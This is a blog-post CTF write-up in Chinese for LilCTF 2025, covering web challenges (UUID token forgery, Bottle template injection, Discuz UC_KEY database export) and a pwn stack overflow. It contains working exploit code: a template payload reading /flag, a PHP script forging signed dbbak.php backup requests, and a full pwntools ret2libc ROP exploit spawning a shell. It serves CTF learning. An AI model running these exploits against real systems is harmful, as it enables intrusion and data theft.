@@ -1,0 +1,436 @@
+---
+title: LilCTF 2025 WP
+date: 2025-8-18
+category:
+  - ctf
+tags:
+  - ctf
+desc: 第一次打 ctf 的比赛，和 tgs-ollaic、unkn0wn 组队，还是很开心的
+---
+
+我只写了 Web 题，所以只有 Web 的 WP 是我写的，
+其他的题目是 tgs-ollaic 和 unkn0wn 一并解决的，
+其他的 WP 是 tg-ollaic 写的。
+
+我只展示了一部分 WP，其他的去 tgs-ollaic 博客里看吧。
+
+## Web
+
+### Ekko_note
+
+#### 分析
+
+查看源代码可以找到的提示：random seed
+
+目标是拿到管理员权限执行命令获取 flag
+
+查看源码有一个修改密码发送 Token 的模块，重点关注直接修改管理员密码
+
+有一个 UUID8，UUID 生成要用到 random，而上面设置了 seed 到 startup time，
+翻源码+网络控制台可知有一个 api 在登录状态下会一直发送 startup time，注册一个账号，
+登录，然后拿到 startup time
+
+#### 构造脚本
+
+random seed 为 server startup time, 以此生成相应的 UUID8
+
+UUID8 生成脚本搞了一圈没搞定，在搜索的时候发现 py3.14 rc2 中就有这个 api，
+二话不说，直接 `paru python314` 然后直接调用相应的 uuid8 api 生成相应的 TOKEN, 修改管理员密码
+
+#### 找 flag
+
+最后，尝试着执行一些命令、想办法找到 flag，使用 nc 将结果输出到服务器（看着场景比较简单，没用反弹shell（因为我还不会反弹shell））
+
+### ez_bottle
+
+分析源码可发现使用了 bottle 这个轻量级 Web 框架，
+分析题目逻辑，发现是渲染 template(模板)，
+重点关注通过模板注入 PHP 语句来获取 flag，
+我们发现 `{}<>` 都用不了，但是查官网可知，
+bottle 还有 `%` 可以用来调用一行 PHP 脚本。
+
+那其他的系统 api 屏蔽词怎么办呢？
+
+1. 使用斜体可以绕过检测
+2. 因为有上传系统，我们可以先上传一个文件，获取地址，
+   再用后上传的文件去加载这个文件
+
+我选择了 2，因为要传递回显，不用 `{}` 的话我不知道怎么传
+
+最后构造出来的脚本很简洁
+
+a.tpl
+
+```
+% import os
+% with open('/flag', 'r', encoding='utf-8') as f:
+    % content = f.read()
+    {{content}}
+% end
+```
+
+上传后获取 a.tpl 的 hash，填到 b.tpl 中
+
+b.tpl
+
+```
+% include('uploads/8b961bf855a7b98f9be204d5f9deb096/a.tpl')
+```
+
+随后上传并访问 t.tpl 即可绕过检测
+
+（构造 a.tpl 的时候一直以为题目中 /flag 指的是网站根目录，结果是在系统根目录）
+
+### 我曾有一份工作
+
+扫描发现 `www.zip`
+
+下载，发现 `config_ucenter.php` 中有 `UC_KEY`，
+另一个 `config_global.php` 文件中还有`authkey`
+
+但是我们的目标不是 `getshell` 而是 获取数据库中 `pre_a_flag` 的值，
+所以我们重点关注 数据库
+
+发现 有一个 sql backup 文件夹，可惜里面是空的，
+如果要爆破目录复杂度太高，放弃
+
+搜索 `UC_KEY` 利用方法，重点关注 `uc.php`, `dbbak.php` 的 api
+
+大量搜索 `uc.php` 寻找可以利用这两个 key 的 api，
+要么就是太过复杂，要么就是无法确保一定会成功，
+而且很多都需要 admin 权限（这个权限我想了一下，不好搞）
+
+回到 `dbbak.php`, 料想备份数据库的操作会比较轻松，
+所以想办法通过这里的 api 备份一次数据库
+
+我们搜索 发现 method `export` 可以用来备份数据库，
+回溯 $get 发现是由 $code 生成的
+
+```php
+parse_str(_authcode($code, 'DECODE', UC_KEY), $get);
+```
+
+看一下 `_authcode` 函数，发现其同时实现了 解密逻辑，
+直接其调用 `DECODE` 即可
+
+因为还涉及时间戳，所以需要程序动态生成 请求
+
+把 `dbbak.php` 扔给 DeepSeek, 让他生成一份请求脚本
+
+```php
+<?php
+// 配置参数
+$targetUrl = "";
+$UC_KEY = "N8ear1n0q4s646UeZeod130eLdlbqfs1BbRd447eq866gaUdmek7v2D9r9EeS6vb";
+$apptype = "discuzx";
+
+// 从dbbak.php提取的加密函数
+function _authcode($string, $operation = 'ENCODE', $key = '', $expiry = 0) {
+    $ckey_length = 4;
+    $key = md5($key ? $key : '');
+    $keya = md5(substr($key, 0, 16));
+    $keyb = md5(substr($key, 16, 16));
+    $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';
+
+    $cryptkey = $keya.md5($keya.$keyc);
+    $key_length = strlen($cryptkey);
+
+    $string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;
+    $string_length = strlen($string);
+
+    $result = '';
+    $box = range(0, 255);
+
+    $rndkey = array();
+    for($i = 0; $i <= 255; $i++) {
+        $rndkey[$i] = ord($cryptkey[$i % $key_length]);
+    }
+
+    for($j = $i = 0; $i < 256; $i++) {
+        $j = ($j + $box[$i] + $rndkey[$i]) % 256;
+        $tmp = $box[$i];
+        $box[$i] = $box[$j];
+        $box[$j] = $tmp;
+    }
+
+    for($a = $j = $i = 0; $i < $string_length; $i++) {
+        $a = ($a + 1) % 256;
+        $j = ($j + $box[$a]) % 256;
+        $tmp = $box[$a];
+        $box[$a] = $box[$j];
+        $box[$j] = $tmp;
+        $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
+    }
+
+    if($operation == 'DECODE') {
+        if(((int)substr($result, 0, 10) == 0 || (int)substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) === substr(md5(substr($result, 26).$keyb), 0, 16)) {
+            return substr($result, 26);
+        } else {
+            return '';
+        }
+    } else {
+        return $keyc.str_replace('=', '', base64_encode($result));
+    }
+}
+
+// 1. 构造请求参数
+$get = [
+    'method' => 'export',
+    'time' => time(),
+    'volume' => 0,
+    'sqlpath' => '',
+    'backupfilename' => date('ymd').'_'.bin2hex(random_bytes(3))
+];
+
+// 2. 生成查询字符串并加密
+$queryString = http_build_query($get);
+$code = _authcode($queryString, 'ENCODE', $UC_KEY);
+
+// 3. 构造最终请求URL
+$requestUrl = $targetUrl."?apptype=".$apptype."&code=".urlencode($code);
+
+// 4. 发送HTTP请求
+echo "正在发送请求到: ".$requestUrl."\n\n";
+
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, $requestUrl);
+curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+curl_setopt($ch, CURLOPT_HEADER, false);
+$response = curl_exec($ch);
+$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+curl_close($ch);
+
+echo $response;
+
+// 5. 处理响应
+echo "HTTP状态码: ".$httpCode."\n";
+echo "响应内容:\n";
+echo "----------------------------------------\n";
+
+if($httpCode == 200) {
+    // 尝试解析XML响应
+    $xml = @simplexml_load_string($response);
+    if($xml !== false) {
+        echo "备份操作结果:\n";
+
+        // 显示错误信息（如果有）
+        if(isset($xml->error)) {
+            echo "错误代码: ".$xml->error['errorCode']."\n";
+            echo "错误信息: ".$xml->error['errorMessage']."\n";
+        }
+
+        // 显示文件信息（成功时）
+        if(isset($xml->fileinfo)) {
+            echo "\n备份文件信息:\n";
+            echo "文件序号: ".$xml->fileinfo->file_num."\n";
+            echo "文件大小: ".$xml->fileinfo->file_size." bytes\n";
+            echo "文件名: ".$xml->fileinfo->file_name."\n";
+            echo "文件URL: ".$xml->fileinfo->file_url."\n";
+            echo "最后修改: ".date('Y-m-d H:i:s', $xml->fileinfo->last_modify)."\n";
+        }
+
+        // 显示下一卷URL（分卷备份时）
+        if(isset($xml->nexturl) && !empty($xml->nexturl)) {
+            echo "\n下一卷URL:\n".$xml->nexturl."\n";
+        }
+    } else {
+        // 非XML响应直接输出
+        echo $response;
+    }
+} else {
+    echo "请求失败，HTTP状态码: ".$httpCode."\n";
+    echo $response;
+}
+
+echo "\n----------------------------------------\n";
+?>
+```
+
+随后运行可以拿到 链接地址，访问可以下载 sql 文件
+
+打开，搜索 `pre_a_flag`，找到 VALUE 那一行，拿到 flag 的 hex，放到 赛博厨子 中解码即可
+
+## PWN
+
+### 签到
+
+对拿到的三个文件 `file` 一下, 发现要用加载器来运行 `./ld-linux-x86-64.so.2 --library-path . ./pwn`, 而且 `pwn` 是 `not stripped` 的, 可以方便地查看各种函数。
+
+`checksec` 一下, 发现没有栈保护 (No Canary), 地址不会随机化 (No PIE), 某些内存区域不可执行 (NX enabled)。
+
+尝试运行程序, 发现输入过长的 A 会 `SIGSEV`, 可以栈溢出。
+
+#### 漏洞分析
+
+用 IDA 打开, 分析 `main` 函数。
+
+```asm
+; Attributes: bp-based frame
+
+; int __cdecl main(int argc, const char **argv, const char **envp)
+public main
+main proc near
+
+buf= byte ptr -70h
+
+; __unwind {
+endbr64
+push    rbp
+mov     rbp, rsp
+sub     rsp, 70h
+mov     rax, cs:stdin@GLIBC_2_2_5
+mov     esi, 0          ; buf
+mov     rdi, rax        ; stream
+call    _setbuf
+mov     rax, cs:__bss_start
+mov     esi, 0          ; buf
+mov     rdi, rax        ; stream
+call    _setbuf
+mov     rax, cs:stderr@GLIBC_2_2_5
+mov     esi, 0          ; buf
+mov     rdi, rax        ; stream
+call    _setbuf
+lea     rax, s          ; "Welcome to lilctf!"
+mov     rdi, rax        ; s
+call    _puts
+lea     rax, aWhatSYourName ; "What's your name?"
+mov     rdi, rax        ; s
+call    _puts
+lea     rax, [rbp+buf]
+mov     edx, 200h       ; nbytes
+mov     rsi, rax        ; buf
+mov     edi, 0          ; fd
+mov     eax, 0
+call    _read
+mov     eax, 0
+leave
+retn
+; } // starts at 401178
+main endp
+
+_text ends
+```
+
+显然, 程序在栈上开辟了 `0x70` 的缓冲区, 却调用 `read` 函数试图读入 `0x200` 的数据, 存在栈溢出漏洞。
+经过计算, 覆盖到返回地址需要 `112 (buf) + 8 (rbp) = 120` 字节的填充。
+
+#### 攻击思路
+
+检查函数列表, 没有发现 `win` 或 `get_shell` 之类的后门函数, 做不了 `ret2text`。
+
+由于 `NX` 开启, 无法直接执行栈上的 shellcode。
+但我们可以劫持程序执行流,
+跳转到 `libc` 中现有的 `system` 函数, 执行 `system("/bin/sh")` 来获取 shell。
+
+然而, 由于 ASLR 的存在, `libc` 的基地址每次运行都是随机的。
+因此, 攻击分两步:
+
+1. 先用一个 `libc` 函数的真实地址来计算基址
+2. 再利用这个基址来计算 `system` 的地址并调用
+
+#### 计算 `libc` 基地址
+
+我们的目标是诱导程序执行 `puts(puts@got)`。
+`puts@got` 中存放着 `puts` 函数在内存中的真实地址,
+调用 `puts` 把它打印出来, 我们就能知道这个地址。
+（当然，之后我们应诱导重进 `main`，
+而非重启程序，因为重启之后基地址又变了。）
+
+#### 寻找 Gadgets
+
+我们需要一个 `pop rdi; ret` 的 `gadget` 来给 `puts` 函数传递参数 (`puts@got` 的地址)。
+（这段汇编的意思是将栈最上面的值弹出并加载到寄存器中，随即返回）
+
+```sh
+ROPgadget --binary ./pwn --only "pop rdi|ret"
+```
+
+构建 Payload 1, 我们的 ROP 链要做三件事:
+
+- 将 `puts@got` 的地址放入 `rdi` 寄存器。
+- 调用 `puts@plt`。
+- 执行完后, 返回 `main` 函数的开头, 以便我们进行第二次攻击。
+
+```python
+rop_chain_1 = p64(pop_rdi)       # 执行 pop rdi; ret
+rop_chain_1 += p64(puts_got)     # 将 puts@got 的地址放入 rdi
+rop_chain_1 += p64(puts_plt)     # 调用 puts
+rop_chain_1 += p64(main_addr)    # puts 返回后, 重新执行 main
+```
+
+#### Get Shell
+
+拿到 `puts` 的真实地址后, 减去它在 `libc` 文件中的偏移,
+就算出了 `libc` 的基地址。
+然后, 就可以计算出 `system` 和 `"/bin/sh"` 的精确地址。
+
+解决栈对齐问题, 在64位系统中, 调用函数时要求栈是16字节对齐的。
+我们的 ROP 链从 `main` 函数 `ret` (弹出8字节) 开始,
+破坏了对齐。如果直接调用 `system`, 会导致 `SIGSEGV`。
+
+解决方案: 在调用 `system` 之前, 先跳转到一个 `ret` gadget,
+它会再弹出8字节, 从而让栈 `(8+8=16)` 重新对齐。
+
+构建 Payload 2, 这次的 ROP 链目标是执行 `system("/bin/sh")`。
+
+```python
+rop_chain_2 = p64(ret_gadget)    # 用于栈对齐
+rop_chain_2 += p64(pop_rdi)      # 执行 pop rdi; ret
+rop_chain_2 += p64(bin_sh_addr)  # 将 "/bin/sh" 的地址放入 rdi
+rop_chain_2 += p64(system_addr)  # 调用 system
+```
+
+#### 最终 Exploit 脚本
+
+将上述思路整合, 编写 `pwntools` 脚本。
+
+```python
+from pwn import *
+
+USE_REMOTE = True
+HOST = ''
+PORT = 33394
+
+elf = context.binary = ELF('./pwn')
+libc = ELF('./libc.so.6')
+
+if USE_REMOTE:
+    p = remote(HOST, PORT)
+else:
+    p = process(['./ld-linux-x86-64.so.2', '--library-path', '.', './pwn'])
+
+rop = ROP(elf)
+pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
+ret_gadget = rop.find_gadget(['ret'])[0]
+
+puts_plt = elf.plt['puts']
+puts_got = elf.got['puts']
+main_addr = elf.symbols['main']
+padding = b'A' * 120
+
+log.info("### Stage 1: Leaking puts address...")
+p.recvuntil(b"What's your name?\n")
+payload1 = padding + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)
+p.sendline(payload1)
+leaked_data = p.recvline().strip()
+leaked_puts_addr = u64(leaked_data.ljust(8, b'\x00'))
+
+p.recvuntil(b"What's your name?\n")
+libc_base = leaked_puts_addr - libc.symbols['puts']
+system_addr = libc_base + libc.symbols['system']
+bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))
+payload2 = padding + p64(ret_gadget) + p64(pop_rdi) + p64(bin_sh_addr) + p64(system_addr)
+log.info("### Stage 2: Getting Shell...")
+p.sendline(payload2)
+
+p.interactive()
+```
+
+运行脚本, 成功拿到 shell
+
+```shell
+ls
+cat ./flag
+```
+
+拿到 flag
